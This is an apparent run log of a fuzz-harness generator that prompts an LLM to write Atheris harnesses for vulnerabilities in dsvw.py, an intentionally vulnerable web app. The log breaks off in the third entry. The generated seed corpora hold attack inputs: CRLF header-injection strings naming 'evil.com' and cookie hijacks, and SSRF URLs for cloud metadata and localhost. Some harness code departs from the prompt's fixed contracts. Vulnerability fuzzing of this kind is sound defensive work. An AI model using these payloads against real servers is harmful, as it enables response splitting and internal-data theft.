# Oraculum Harness Run

- Started: `2026-07-14T14:29:40`
- Repo: `python/realvuln-dsvw`
- Output dir: `/home/trieudai/Oraculum/output`

## [1/7] py/http-response-splitting

- File: `dsvw.py:78`
- Target: `py_http_response_splitting_dsvw_py_78`
- Oracle: `/home/trieudai/Oraculum/output/python/realvuln-dsvw/fuzz_oracles/py_http_response_splitting_dsvw_py_78.json`
- Harness: `/home/trieudai/Oraculum/output/python/realvuln-dsvw/fuzz_targets/py_http_response_splitting_dsvw_py_78.py`
- Corpus: `/home/trieudai/Oraculum/output/python/realvuln-dsvw/fuzz_corpus/py_http_response_splitting_dsvw_py_78`

### System Prompt

````text
You are an expert security fuzzing engineer specializing in Python vulnerability research.
Your task is to complete an Atheris fuzz harness that detects sink-reachability bugs
(SSRF, path traversal, command injection, etc.) using a recorded_call oracle strategy.

## Your Role
You intercept a specific function call (the "sink") by mocking it, then inspect
the argument that reaches it. If the argument matches any forbidden pattern,
the oracle fires.

## Critical Oracle Rule — Read This First
The oracle fires on what REACHES the sink, not on what enters the function.
_COMPILED_PATTERNS must be applied ONLY to the argument captured at the patched
call (call.args or call.kwargs) — never to the input parameter itself.

Applying patterns to the input parameter is ALWAYS wrong for recorded_call strategy.
It causes the oracle to fire before the function executes, turning every seed
corpus entry into a false positive regardless of whether the vulnerability exists.

## Harness Completion Rules

### Structure
- Output a single complete Python file. No markdown. No explanation. No code fences.
- You may add helper functions, imports, or constants outside TestOneInput.
- Do not modify any section marked FIXED CONTRACTS.

### TestOneInput — Required Logic

1. INPUT GENERATION
   - Use FuzzedDataProvider to generate inputs for all tainted params based on
     the function signature.

   - STRING INPUTS REGULATION:
     * Always generate string/unicode inputs by consuming bytes and decoding them to preserve raw payloads:
       val = fdp.ConsumeBytes(1024).decode('utf-8', errors='ignore')
     * Do NOT use ConsumeUnicodeNoSurrogates() for arguments that need to match exact exploit patterns (like shell commands, import statement strings).

   - Buffer allocation strategy (inferred from signature):
       - MULTIPLE params → split the buffer proportionally by param count.
         For str/bytes params, divide remaining bytes evenly; consume the
         last str/bytes param with remaining bytes. Fixed-size types (int,
         float, bool) consume their natural byte width first, then split
         the remainder among str/bytes params.
       - FORBIDDEN: Do NOT use ConsumeIntInRange() to select a strategy
         index or branch — this prevents the fuzzer from mutating payload.

2. SKIP CONDITION
   - Apply the skip_hint early in TestOneInput.
   - If input does not meet minimum criteria, return immediately.
   - This avoids wasting fuzzer cycles on irrelevant inputs.
   - The skip condition filters INPUT only — it has no relation to the oracle check.

3. MOCK SETUP
   - Patch the exact target specified in patch_target.
   - Mock only the patched sink. Do NOT mock validation functions, input parsers,
     or any function called BEFORE the sink — those must execute with real logic
     so that the fuzzer tests actual data flow to the sink.
   - Mock return value must be realistic enough for the target function to continue
     executing past the patched call — use MagicMock with appropriate spec.
   - Use `with patch(...) as mock_obj:` scoping.

4. FUNCTION CALL
   - Call the target function inside the patch context.
   - Wrap in try/except Exception: pass — but keep RuntimeError re-raise outside.

5. ORACLE CHECK  ← must be OUTSIDE the function call try/except, INSIDE the patch context
   - After the target function call, iterate mock_obj.call_args_list.
   - For each call, extract the captured argument:
     * Check call.args[target_arg_index] first.
     * Fall back to call.kwargs.get(target_arg_name) if args is empty.
     * kwargs fallback must use a string key ("url", "request", etc.) — never None.
   - Convert captured to str before pattern matching.
   - Run every pattern in _COMPILED_PATTERNS against the captured value.
   - On any match: raise RuntimeError(_RAISE_MESSAGE)

6. EXCEPTION HANDLING
   - except RuntimeError: raise        → never swallow oracle signals
   - except Exception: pass            → swallow all other exceptions
   - Never use bare except.

### Input Generation Strategy
- Think about what values would cause the tainted param to reach the sink.
- Generate variations covering: scheme prefixes, IP formats, encoding variants,
  edge cases from trigger_patterns.
- Do not limit generation to only the seed corpus.

### What NOT to Do
- Do NOT run _COMPILED_PATTERNS against the input parameter — patterns must be
  applied only to the argument captured at the sink.
- Do NOT mock any function called before the sink — validation and parsing logic
  must run with real behavior.
- Do NOT use call.kwargs.get(None) — always use a named string key.
- Do NOT place the oracle check inside the function call try/except block —
  RuntimeError from the oracle must propagate to Atheris.

### Seed Corpus Rules (CRITICAL)
- Define _SEED_CORPUS as a module-level list OUTSIDE TestOneInput.
- Populate it with at least 6 bypass-oriented entries derived from
  trigger_patterns and condition_desc.
- Entries must be designed to reach the sink and trigger oracle patterns.
  Cover: internal IPs, metadata endpoints, file URIs, mixed-case schemes,
  encoded variants.
- NEVER reference _SEED_CORPUS inside TestOneInput.
- NEVER use ConsumeBool() or ConsumeIntInRange() to select from _SEED_CORPUS.
- Seeds are exported to disk at startup (see __main__ block in template).
  libFuzzer will mutate their raw bytes directly — this is how coverage-guided
  mutation works correctly.

## Quality Checklist (verify before outputting)
[ ] All tainted params are fuzzed via FuzzedDataProvider, consuming len(data) for single param
[ ] No ConsumeBool()/ConsumeIntInRange() used to index into a seed list inside TestOneInput
[ ] _SEED_CORPUS defined at module level, outside TestOneInput
[ ] _SEED_CORPUS has at least 6 entries derived from trigger_patterns
[ ] String inputs generated using ConsumeBytes().decode() instead of ConsumeUnicodeNoSurrogates() to preserve seeds
[ ] skip_condition applied to input only — not used in oracle
[ ] patch_target mocked correctly, no pre-sink functions mocked
[ ] Oracle check is OUTSIDE the function call try/except
[ ] Oracle check applies _COMPILED_PATTERNS to captured sink argument, NOT to input
[ ] Both call.args and call.kwargs checked with string key (never None)
[ ] captured converted to str before pattern matching
[ ] RuntimeError is re-raised, never swallowed
[ ] No markdown or explanation in output
````


### User Prompt

````text
Complete the following partial Atheris harness by filling in the TestOneInput body.
Output the complete Python script only. No markdown, no explanation.

# AUTO-GENERATED ATHERIS HARNESS
# rule_id  : py/http-response-splitting
# function : do_GET
# file     : dsvw.py
# ================================================================
import atheris
import sys
import re
import os

from unittest.mock import patch, MagicMock



REPO_ROOT = "/home/trieudai/VulnHunterX/repos/python/realvuln-dsvw"
if REPO_ROOT and REPO_ROOT not in sys.path:
    sys.path.insert(0, REPO_ROOT)

with atheris.instrument_imports():

    from dsvw import do_GET


# === FIXED CONTRACTS (DO NOT MODIFY) ===
_COMPILED_PATTERNS = [

    re.compile("charset=[^;]*\\r\\n", re.IGNORECASE),

    re.compile("charset=[^;]*\\n\\r", re.IGNORECASE),

    re.compile("charset=[^;]*\\r[^\\n]", re.IGNORECASE),

    re.compile("charset=[^;]*\\n[^\\r]", re.IGNORECASE),

]
_RAISE_MESSAGE  = "PY_HTTP-RESPONSE-SPLITTING: HTTP response splitting detected in Content-Type header - captured={captured} pattern={matched_pattern}"
_TAINTED_PARAMS = []
# ========================================

# === ORACLE CONTEXT ===
# strategy         : recorded_call
# patch_target     : http.server.BaseHTTPRequestHandler.send_header
# target_arg_index : 1
# target_arg_name  : message
# input_strategy   : flask_view
# signature        : def do_GET(self)
# condition        : Captured Content-Type header contains CRLF sequences that indicate HTTP response splitting
# capture_what     : Content-Type header value with user-controlled charset parameter
# skip_hint        : False
# ========================================


# === RECORDED_CALL SKELETON ===
# TODO: Complete TestOneInput following these steps:
# 1. Generate inputs using FuzzedDataProvider.
# 2. Apply skip_hint (if applicable).
# 3. Mock the patch target using patch/MagicMock.
# 4. Call target function inside the mock context.
# 5. Compare mock call arguments against _COMPILED_PATTERNS.
# 6. Propagate RuntimeError; swallow other exceptions.
# ==========================================



def TestOneInput(data):
    fdp = atheris.FuzzedDataProvider(data)
    # NOTE: For string inputs, use fdp.ConsumeBytes(1024).decode('utf-8', errors='ignore')
    #       instead of ConsumeUnicodeNoSurrogates() to preserve raw seed payloads.
    
    # 1. Generate inputs from fdp
    
    query_params = {
        
    }
    
    # 2. Wrap in Flask Request Context
    with app.test_request_context(query_string=query_params):
        pass  # [FILL HERE — follow the skeleton above]
    


# === SEED CORPUS — bypass-oriented, derived from trigger_patterns ===
# LLM: populate _SEED_CORPUS with entries designed to SURVIVE the filter,
# not just trigger it. Cover: mixed case, whitespace injection, unicode
# homoglyphs, double encoding, tag nesting, attribute abuse.
_SEED_CORPUS = [
    # [FILL HERE — at least 6 bypass-attempt strings]
]


if __name__ == "__main__":
    # Export seed corpus to disk so libFuzzer can mutate raw bytes directly.
    # This preserves coverage-guided mutation — fuzzer mutates content, not index.
    _CORPUS_DIR = "/home/trieudai/Oraculum/output/python/realvuln-dsvw/fuzz_corpus/py_http_response_splitting_dsvw_py_78"
    os.makedirs(_CORPUS_DIR, exist_ok=True)
    for _i, _seed in enumerate(_SEED_CORPUS):
        _seed_path = os.path.join(_CORPUS_DIR, f"seed_{_i:03d}")
        if not os.path.exists(_seed_path):
            with open(_seed_path, "wb") as _f:
                _f.write(_seed.encode("utf-8"))

    if _CORPUS_DIR not in sys.argv:
        sys.argv.append(_CORPUS_DIR)

    atheris.Setup(sys.argv, TestOneInput)
    atheris.Fuzz()
````


### LLM Response (Iteration 1)

````text
import atheris
import sys
import re
import os
from unittest.mock import patch, MagicMock
from io import BytesIO
from http.server import BaseHTTPRequestHandler
import urllib.parse

REPO_ROOT = "/home/trieudai/VulnHunterX/repos/python/realvuln-dsvw"
if REPO_ROOT and REPO_ROOT not in sys.path:
    sys.path.insert(0, REPO_ROOT)

with atheris.instrument_imports():
    from dsvw import DatastoreViewer

# === FIXED CONTRACTS (DO NOT MODIFY) ===
_COMPILED_PATTERNS = [
    re.compile(b"charset=[^;]*\r\n", re.IGNORECASE),
    re.compile(b"charset=[^;]*\n\r", re.IGNORECASE),
    re.compile(b"charset=[^;]*\r[^\n]", re.IGNORECASE),
    re.compile(b"charset=[^;]*\n[^\r]", re.IGNORECASE),
]
_RAISE_MESSAGE  = "PY_HTTP-RESPONSE-SPLITTING: HTTP response splitting detected in Content-Type header - captured={captured} pattern={matched_pattern}"
_TAINTED_PARAMS = []
# ========================================

# === ORACLE CONTEXT ===
# strategy         : recorded_call
# patch_target     : http.server.BaseHTTPRequestHandler.send_header
# target_arg_index : 1
# target_arg_name  : message
# input_strategy   : flask_view
# signature        : def do_GET(self)
# condition        : Captured Content-Type header contains CRLF sequences that indicate HTTP response splitting
# capture_what     : Content-Type header value with user-controlled charset parameter
# skip_hint        : False
# ========================================

class MockRequestHandler(BaseHTTPRequestHandler):
    def __init__(self, request_text):
        self.rfile = BytesIO(request_text)
        self.wfile = BytesIO()
        self.raw_requestline = self.rfile.readline()
        self.error_content_type = "text/html"
        self.error_message_format = ""
        self.server = MagicMock()
        self.client_address = ('127.0.0.1', 8080)
        self.setup()
        
    def setup(self):
        pass
        
    def log_message(self, format, *args):
        pass

def TestOneInput(data):
    fdp = atheris.FuzzedDataProvider(data)
    
    # Generate charset value that might contain CRLF
    charset_value = fdp.ConsumeBytes(512)
    
    # Create HTTP request with malicious charset in Accept-Charset header
    request_text = b"GET / HTTP/1.1\r\n"
    request_text += b"Host: localhost\r\n"
    request_text += b"Accept-Charset: " + charset_value + b"\r\n"
    request_text += b"\r\n"
    
    try:
        # Create mock request handler
        handler = MockRequestHandler(request_text)
        
        # Mock send_header to capture Content-Type header values
        with patch('http.server.BaseHTTPRequestHandler.send_header') as mock_send_header:
            # Create DatastoreViewer instance
            viewer = DatastoreViewer({})
            
            # Set the handler to use our mock
            viewer.requestline = handler.requestline
            viewer.request_version = handler.request_version
            viewer.headers = handler.headers
            viewer.wfile = handler.wfile
            viewer.rfile = handler.rfile
            viewer.client_address = handler.client_address
            viewer.server = handler.server
            
            try:
                # Call the target function
                viewer.do_GET()
            except Exception:
                pass  # Swallow all exceptions except RuntimeError
            
            # Oracle check - outside the function call try/except
            for call in mock_send_header.call_args_list:
                # Check if this is a Content-Type header
                if call.args and len(call.args) > 1 and call.args[0] == 'Content-Type':
                    captured = call.args[1]
                    # Convert to bytes if it's a string
                    if isinstance(captured, str):
                        captured = captured.encode('utf-8', errors='ignore')
                    
                    # Check against all patterns
                    for pattern in _COMPILED_PATTERNS:
                        if pattern.search(captured):
                            raise RuntimeError(_RAISE_MESSAGE.format(
                                captured=captured, 
                                matched_pattern=pattern.pattern.decode('utf-8', errors='ignore')
                            ))
                elif call.kwargs and call.kwargs.get('keyword') == 'Content-Type':
                    captured = call.kwargs.get('message', '')
                    # Convert to bytes if it's a string
                    if isinstance(captured, str):
                        captured = captured.encode('utf-8', errors='ignore')
                    
                    # Check against all patterns
                    for pattern in _COMPILED_PATTERNS:
                        if pattern.search(captured):
                            raise RuntimeError(_RAISE_MESSAGE.format(
                                captured=captured, 
                                matched_pattern=pattern.pattern.decode('utf-8', errors='ignore')
                            ))
    except RuntimeError:
        raise  # Propagate oracle findings
    except Exception:
        pass  # Swallow all other exceptions

# === SEED CORPUS — bypass-oriented, derived from trigger_patterns ===
_SEED_CORPUS = [
    "charset=test\r\nLocation: evil.com",
    "charset=test\n\rSet-Cookie: hijack=1",
    "charset=test\rX: y",
    "charset=test\nX: y",
    "charset=\r\n\r\n<script>alert(1)</script>",
    "charset=\n\r\n\r<script>alert(1)</script>",
    "charset=test%0d%0aLocation:%20evil.com",
    "charset=test%0a%0dSet-Cookie:%20hijack=1"
]

if __name__ == "__main__":
    # Export seed corpus to disk so libFuzzer can mutate raw bytes directly.
    # This preserves coverage-guided mutation — fuzzer mutates content, not index.
    _CORPUS_DIR = "/home/trieudai/Oraculum/output/python/realvuln-dsvw/fuzz_corpus/py_http_response_splitting_dsvw_py_78"
    os.makedirs(_CORPUS_DIR, exist_ok=True)
    for _i, _seed in enumerate(_SEED_CORPUS):
        _seed_path = os.path.join(_CORPUS_DIR, f"seed_{_i:03d}")
        if not os.path.exists(_seed_path):
            with open(_seed_path, "wb") as _f:
                _f.write(_seed.encode("utf-8"))

    if _CORPUS_DIR not in sys.argv:
        sys.argv.append(_CORPUS_DIR)

    atheris.Setup(sys.argv, TestOneInput)
    atheris.Fuzz()
````

- Result: `generated`
- Harness: `/home/trieudai/Oraculum/output/python/realvuln-dsvw/fuzz_targets/py_http_response_splitting_dsvw_py_78.py`

## [2/7] py/full-ssrf

- File: `dsvw.py:56`
- Target: `py_full_ssrf_dsvw_py_56`
- Oracle: `/home/trieudai/Oraculum/output/python/realvuln-dsvw/fuzz_oracles/py_full_ssrf_dsvw_py_56.json`
- Harness: `/home/trieudai/Oraculum/output/python/realvuln-dsvw/fuzz_targets/py_full_ssrf_dsvw_py_56.py`
- Corpus: `/home/trieudai/Oraculum/output/python/realvuln-dsvw/fuzz_corpus/py_full_ssrf_dsvw_py_56`

### System Prompt

````text
You are an expert security fuzzing engineer specializing in Python vulnerability research.
Your task is to complete an Atheris fuzz harness that detects sink-reachability bugs
(SSRF, path traversal, command injection, etc.) using a recorded_call oracle strategy.

## Your Role
You intercept a specific function call (the "sink") by mocking it, then inspect
the argument that reaches it. If the argument matches any forbidden pattern,
the oracle fires.

## Critical Oracle Rule — Read This First
The oracle fires on what REACHES the sink, not on what enters the function.
_COMPILED_PATTERNS must be applied ONLY to the argument captured at the patched
call (call.args or call.kwargs) — never to the input parameter itself.

Applying patterns to the input parameter is ALWAYS wrong for recorded_call strategy.
It causes the oracle to fire before the function executes, turning every seed
corpus entry into a false positive regardless of whether the vulnerability exists.

## Harness Completion Rules

### Structure
- Output a single complete Python file. No markdown. No explanation. No code fences.
- You may add helper functions, imports, or constants outside TestOneInput.
- Do not modify any section marked FIXED CONTRACTS.

### TestOneInput — Required Logic

1. INPUT GENERATION
   - Use FuzzedDataProvider to generate inputs for all tainted params based on
     the function signature.

   - STRING INPUTS REGULATION:
     * Always generate string/unicode inputs by consuming bytes and decoding them to preserve raw payloads:
       val = fdp.ConsumeBytes(1024).decode('utf-8', errors='ignore')
     * Do NOT use ConsumeUnicodeNoSurrogates() for arguments that need to match exact exploit patterns (like shell commands, import statement strings).

   - Buffer allocation strategy (inferred from signature):
       - MULTIPLE params → split the buffer proportionally by param count.
         For str/bytes params, divide remaining bytes evenly; consume the
         last str/bytes param with remaining bytes. Fixed-size types (int,
         float, bool) consume their natural byte width first, then split
         the remainder among str/bytes params.
       - FORBIDDEN: Do NOT use ConsumeIntInRange() to select a strategy
         index or branch — this prevents the fuzzer from mutating payload.

2. SKIP CONDITION
   - Apply the skip_hint early in TestOneInput.
   - If input does not meet minimum criteria, return immediately.
   - This avoids wasting fuzzer cycles on irrelevant inputs.
   - The skip condition filters INPUT only — it has no relation to the oracle check.

3. MOCK SETUP
   - Patch the exact target specified in patch_target.
   - Mock only the patched sink. Do NOT mock validation functions, input parsers,
     or any function called BEFORE the sink — those must execute with real logic
     so that the fuzzer tests actual data flow to the sink.
   - Mock return value must be realistic enough for the target function to continue
     executing past the patched call — use MagicMock with appropriate spec.
   - Use `with patch(...) as mock_obj:` scoping.

4. FUNCTION CALL
   - Call the target function inside the patch context.
   - Wrap in try/except Exception: pass — but keep RuntimeError re-raise outside.

5. ORACLE CHECK  ← must be OUTSIDE the function call try/except, INSIDE the patch context
   - After the target function call, iterate mock_obj.call_args_list.
   - For each call, extract the captured argument:
     * Check call.args[target_arg_index] first.
     * Fall back to call.kwargs.get(target_arg_name) if args is empty.
     * kwargs fallback must use a string key ("url", "request", etc.) — never None.
   - Convert captured to str before pattern matching.
   - Run every pattern in _COMPILED_PATTERNS against the captured value.
   - On any match: raise RuntimeError(_RAISE_MESSAGE)

6. EXCEPTION HANDLING
   - except RuntimeError: raise        → never swallow oracle signals
   - except Exception: pass            → swallow all other exceptions
   - Never use bare except.

### Input Generation Strategy
- Think about what values would cause the tainted param to reach the sink.
- Generate variations covering: scheme prefixes, IP formats, encoding variants,
  edge cases from trigger_patterns.
- Do not limit generation to only the seed corpus.

### What NOT to Do
- Do NOT run _COMPILED_PATTERNS against the input parameter — patterns must be
  applied only to the argument captured at the sink.
- Do NOT mock any function called before the sink — validation and parsing logic
  must run with real behavior.
- Do NOT use call.kwargs.get(None) — always use a named string key.
- Do NOT place the oracle check inside the function call try/except block —
  RuntimeError from the oracle must propagate to Atheris.

### Seed Corpus Rules (CRITICAL)
- Define _SEED_CORPUS as a module-level list OUTSIDE TestOneInput.
- Populate it with at least 6 bypass-oriented entries derived from
  trigger_patterns and condition_desc.
- Entries must be designed to reach the sink and trigger oracle patterns.
  Cover: internal IPs, metadata endpoints, file URIs, mixed-case schemes,
  encoded variants.
- NEVER reference _SEED_CORPUS inside TestOneInput.
- NEVER use ConsumeBool() or ConsumeIntInRange() to select from _SEED_CORPUS.
- Seeds are exported to disk at startup (see __main__ block in template).
  libFuzzer will mutate their raw bytes directly — this is how coverage-guided
  mutation works correctly.

## Quality Checklist (verify before outputting)
[ ] All tainted params are fuzzed via FuzzedDataProvider, consuming len(data) for single param
[ ] No ConsumeBool()/ConsumeIntInRange() used to index into a seed list inside TestOneInput
[ ] _SEED_CORPUS defined at module level, outside TestOneInput
[ ] _SEED_CORPUS has at least 6 entries derived from trigger_patterns
[ ] String inputs generated using ConsumeBytes().decode() instead of ConsumeUnicodeNoSurrogates() to preserve seeds
[ ] skip_condition applied to input only — not used in oracle
[ ] patch_target mocked correctly, no pre-sink functions mocked
[ ] Oracle check is OUTSIDE the function call try/except
[ ] Oracle check applies _COMPILED_PATTERNS to captured sink argument, NOT to input
[ ] Both call.args and call.kwargs checked with string key (never None)
[ ] captured converted to str before pattern matching
[ ] RuntimeError is re-raised, never swallowed
[ ] No markdown or explanation in output
````


### User Prompt

````text
Complete the following partial Atheris harness by filling in the TestOneInput body.
Output the complete Python script only. No markdown, no explanation.

# AUTO-GENERATED ATHERIS HARNESS
# rule_id  : py/full-ssrf
# function : do_GET
# file     : dsvw.py
# ================================================================
import atheris
import sys
import re
import os

from unittest.mock import patch, MagicMock



REPO_ROOT = "/home/trieudai/VulnHunterX/repos/python/realvuln-dsvw"
if REPO_ROOT and REPO_ROOT not in sys.path:
    sys.path.insert(0, REPO_ROOT)

with atheris.instrument_imports():

    from dsvw import do_GET


# === FIXED CONTRACTS (DO NOT MODIFY) ===
_COMPILED_PATTERNS = [

    re.compile("http://169\\.254\\.169\\.254.*", re.IGNORECASE),

    re.compile("http://127\\.0\\.0\\.1.*", re.IGNORECASE),

    re.compile("http://\\[::1\\].*", re.IGNORECASE),

    re.compile("https://169\\.254\\.169\\.254.*", re.IGNORECASE),

    re.compile("https://127\\.0\\.0\\.1.*", re.IGNORECASE),

    re.compile("https://\\[::1\\].*", re.IGNORECASE),

    re.compile("http://localhost.*", re.IGNORECASE),

    re.compile("https://localhost.*", re.IGNORECASE),

]
_RAISE_MESSAGE  = "PY_FULL-SSRF: SSRF attempt detected - captured={captured} pattern={matched_pattern}"
_TAINTED_PARAMS = [{"name": "include_param", "index": 0, "type": "str"}]
# ========================================

# === ORACLE CONTEXT ===
# strategy         : recorded_call
# patch_target     : urllib.request.urlopen
# target_arg_index : 0
# target_arg_name  : url
# input_strategy   : flask_view
# signature        : def do_GET(self)
# condition        : Captured URL matches known SSRF attack patterns (e.g., internal IPs, metadata URLs)
# capture_what     : URL passed to urlopen from params["include"]
# skip_hint        : not ('://' in include_param)
# ========================================


# === RECORDED_CALL SKELETON ===
# TODO: Complete TestOneInput following these steps:
# 1. Generate inputs using FuzzedDataProvider.
# 2. Apply skip_hint (if applicable).
# 3. Mock the patch target using patch/MagicMock.
# 4. Call target function inside the mock context.
# 5. Compare mock call arguments against _COMPILED_PATTERNS.
# 6. Propagate RuntimeError; swallow other exceptions.
# ==========================================



def TestOneInput(data):
    fdp = atheris.FuzzedDataProvider(data)
    # NOTE: For string inputs, use fdp.ConsumeBytes(1024).decode('utf-8', errors='ignore')
    #       instead of ConsumeUnicodeNoSurrogates() to preserve raw seed payloads.
    
    # 1. Generate inputs from fdp
    
    param_include_param = fdp.ConsumeBytes(1024).decode('utf-8', errors='ignore')
    
    query_params = {
        
        "include_param": param_include_param,
        
    }
    
    # 2. Wrap in Flask Request Context
    with app.test_request_context(query_string=query_params):
        pass  # [FILL HERE — follow the skeleton above]
    


# === SEED CORPUS — bypass-oriented, derived from trigger_patterns ===
# LLM: populate _SEED_CORPUS with entries designed to SURVIVE the filter,
# not just trigger it. Cover: mixed case, whitespace injection, unicode
# homoglyphs, double encoding, tag nesting, attribute abuse.
_SEED_CORPUS = [
    # [FILL HERE — at least 6 bypass-attempt strings]
]


if __name__ == "__main__":
    # Export seed corpus to disk so libFuzzer can mutate raw bytes directly.
    # This preserves coverage-guided mutation — fuzzer mutates content, not index.
    _CORPUS_DIR = "/home/trieudai/Oraculum/output/python/realvuln-dsvw/fuzz_corpus/py_full_ssrf_dsvw_py_56"
    os.makedirs(_CORPUS_DIR, exist_ok=True)
    for _i, _seed in enumerate(_SEED_CORPUS):
        _seed_path = os.path.join(_CORPUS_DIR, f"seed_{_i:03d}")
        if not os.path.exists(_seed_path):
            with open(_seed_path, "wb") as _f:
                _f.write(_seed.encode("utf-8"))

    if _CORPUS_DIR not in sys.argv:
        sys.argv.append(_CORPUS_DIR)

    atheris.Setup(sys.argv, TestOneInput)
    atheris.Fuzz()
````


### LLM Response (Iteration 1)

````text
import atheris
import sys
import re
import os
from unittest.mock import patch, MagicMock
from urllib.parse import urlencode

REPO_ROOT = "/home/trieudai/VulnHunterX/repos/python/realvuln-dsvw"
if REPO_ROOT and REPO_ROOT not in sys.path:
    sys.path.insert(0, REPO_ROOT)

with atheris.instrument_imports():
    from dsvw import do_GET
    from flask import Flask, request

app = Flask(__name__)

# === FIXED CONTRACTS (DO NOT MODIFY) ===
_COMPILED_PATTERNS = [
    re.compile("http://169\\.254\\.169\\.254.*", re.IGNORECASE),
    re.compile("http://127\\.0\\.0\\.1.*", re.IGNORECASE),
    re.compile("http://\\[::1\\].*", re.IGNORECASE),
    re.compile("https://169\\.254\\.169\\.254.*", re.IGNORECASE),
    re.compile("https://127\\.0\\.0\\.1.*", re.IGNORECASE),
    re.compile("https://\\[::1\\].*", re.IGNORECASE),
    re.compile("http://localhost.*", re.IGNORECASE),
    re.compile("https://localhost.*", re.IGNORECASE),
]
_RAISE_MESSAGE  = "PY_FULL-SSRF: SSRF attempt detected - captured={captured} pattern={matched_pattern}"
_TAINTED_PARAMS = [{"name": "include_param", "index": 0, "type": "str"}]
# ========================================

# === SEED CORPUS — bypass-oriented, derived from trigger_patterns ===
_SEED_CORPUS = [
    "http://169.254.169.254/latest/meta-data/",
    "HTTP://127.0.0.1:8080/admin",
    "https://[::1]/secret",
    "hTTp://LOCALHOST:9000/config",
    "https://169.254.169.254/metadata",
    "http://127.0.0.1/internal",
    "HTTP://[::1]:8080/status",
    "https://localhost/api",
    "http://169.254.169.254/user-data",
    "hTtPs://127.0.0.1:5000/debug"
]

def TestOneInput(data):
    fdp = atheris.FuzzedDataProvider(data)
    
    # 1. Generate inputs from fdp
    param_include_param = fdp.ConsumeBytes(1024).decode('utf-8', errors='ignore')
    
    # 2. Apply skip condition
    if not ('://' in param_include_param):
        return
    
    query_params = {
        "include": param_include_param,
    }
    
    # 3. Mock setup
    mock_response = MagicMock()
    mock_response.read.return_value = b"mocked response"
    mock_response.__enter__ = lambda s: s
    mock_response.__exit__ = lambda s, e, v, t: None
    
    with patch('urllib.request.urlopen', return_value=mock_response) as mock_urlopen:
        # 4. Call target function inside mock context
        try:
            with app.test_request_context('/?'+urlencode(query_params)):
                do_GET()
        except RuntimeError:
            raise
        except Exception:
            pass
        
        # 5. Oracle check - outside try/except but inside patch context
        for call in mock_urlopen.call_args_list:
            captured = None
            if call.args:
                captured = str(call.args[0])
            elif call.kwargs:
                captured = str(call.kwargs.get('url', ''))
            
            if captured:
                for pattern in _COMPILED_PATTERNS:
                    if pattern.match(captured):
                        raise RuntimeError(_RAISE_MESSAGE.format(captured=captured, matched_pattern=pattern.pattern))


if __name__ == "__main__":
    # Export seed corpus to disk so libFuzzer can mutate raw bytes directly.
    _CORPUS_DIR = "/home/trieudai/Oraculum/output/python/realvuln-dsvw/fuzz_corpus/py_full_ssrf_dsvw_py_56"
    os.makedirs(_CORPUS_DIR, exist_ok=True)
    for _i, _seed in enumerate(_SEED_CORPUS):
        _seed_path = os.path.join(_CORPUS_DIR, f"seed_{_i:03d}")
        if not os.path.exists(_seed_path):
            with open(_seed_path, "wb") as _f:
                _f.write(_seed.encode("utf-8"))

    if _CORPUS_DIR not in sys.argv:
        sys.argv.append(_CORPUS_DIR)

    atheris.Setup(sys.argv, TestOneInput)
    atheris.Fuzz()
````

- Result: `generated`
- Harness: `/home/trieudai/Oraculum/output/python/realvuln-dsvw/fuzz_targets/py_full_ssrf_dsvw_py_56.py`

## [3/7] py/path-injection

- File: `dsvw.py:37`
- Target: `py_path_injection_dsvw_py_37`
- Oracle: `/home/trieudai/Oraculum/output/python/realvuln-dsvw/fuzz_oracles/py_path_injection_dsvw_py_37.json`
- Harness: `/home/trieudai/Oraculum/output/python/realvuln-dsvw/fuzz_targets/py_path_injection_dsvw_py_37.py`
- Corpus: `/home/trieudai/Oraculum/output/python/realvuln-dsvw/fuzz_corpus/py_path_injection_dsvw_py_37`

### System Prompt

````text
You are an expert security fuzzing engineer specializing in Python vulnerability research.
Your task is to complete an Atheris fuzz harness that detects sink-reachability bugs
(SSRF, path traversal, command injection, etc.) using a recorded_call oracle strategy.

## Your Role
You intercept a specific function call (the "sink") by mocking it, then inspect
the argument that reaches it. If the argument matches any forbidden pattern,
the oracle fires.

## Critical Oracle Rule — Read This First
The oracle fires on what REACHES the sink, not on what enters the function.
_COMPILED_PATTERNS must be applied ONLY to the argument captured at the patched
call (call.args or call.kwargs) — never to the input parameter itself.

Applying patterns to the input parameter is ALWAYS wrong for recorded_call strategy.
It causes the oracle to fire before the function executes, turning every seed
corpus entry into a false positive regardless of whether the vulnerability exists.

## Harness Completion Rules

### Structure
- Output a single complete Python file. No markdown. No explanation. No code fences.
- You may add helper functions, imports, or constants outside TestOneInput.
- Do not modify any section marked FIXED CONTRACTS.

### TestOneInput — Required Logic

1. INPUT GENERATION
   - Use FuzzedDataProvider to generate inputs for all tainted params based on
     the function signature.

   - STRING INPUTS REGULATION:
     * Always generate string/unicode inputs by consuming bytes and decoding them to preserve raw payloads:
       val = fdp.ConsumeBytes(1024).decode('utf-8', errors='ignore')
     * Do NOT use ConsumeUnicodeNoSurrogates() for arguments that need to match exact exploit patterns (like shell commands, import statement strings).

   - Buffer allocation strategy (inferred from signature):
       - MULTIPLE params → split the buffer proportionally by param count.
         For str/bytes params, divide remaining bytes evenly; consume the
         last str/bytes param with remaining bytes. Fixed-size types (int,
         float, bool) consume their natural byte width first, then split
         the remainder among str/bytes params.
       - FORBIDDEN: Do NOT use ConsumeIntInRange() to select a strategy
         index or branch — this prevents the fuzzer from mutating payload.

2. SKIP CONDITION
   - Apply the skip_hint early in TestOneInput.
   - If input does not meet minimum criteria, return immediately.
   - This avoids wasting fuzzer cycles on irrelevant inputs.
   - The skip condition filters INPUT only — it has no relation to the oracle check.

3. MOCK SETUP
   - Patch the exact target specified in patch_target.
   - Mock only the patched sink. Do NOT mock validation functions, input parsers,
     or any function called BEFORE the sink — those must execute with real logic
     so that the fuzzer tests actual data flow to the sink.
   - Mock return value must be realistic enough for the target function to continue
     executing past the patched call — use MagicMock with appropriate spec.
   - Use `with patch(...) as mock_obj:` scoping.

4. FUNCTION CALL
   - Call the target function inside the patch context.
   - Wrap in try/except Exception: pass — but keep RuntimeError re-raise outside.

5. ORACLE CHECK  ← must be OUTSIDE the function call try/except, INSIDE the patch context
   - After the target function call, iterate mock_obj.call_args_list.
   - For each call, extract the captured argument:
     * Check call.args[target_arg_index] first.
     * Fall back to call.kwargs.get(target_arg_name) if args is empty.
     * kwargs fallback must use a string key ("url", "request", etc.) — never None.
   - Convert captured to str before pattern matching.
   - Run every pattern in _COMPILED_PATTERNS against the captured value.
   - On any match: raise RuntimeError(_RAISE_MESSAGE)

6. EXCEPTION HANDLING
   - except RuntimeError: raise        → never swallow oracle signals
   - except Exception: pass            → swallow all other exceptions
   - Never use bare except.

### Input Generation Strategy
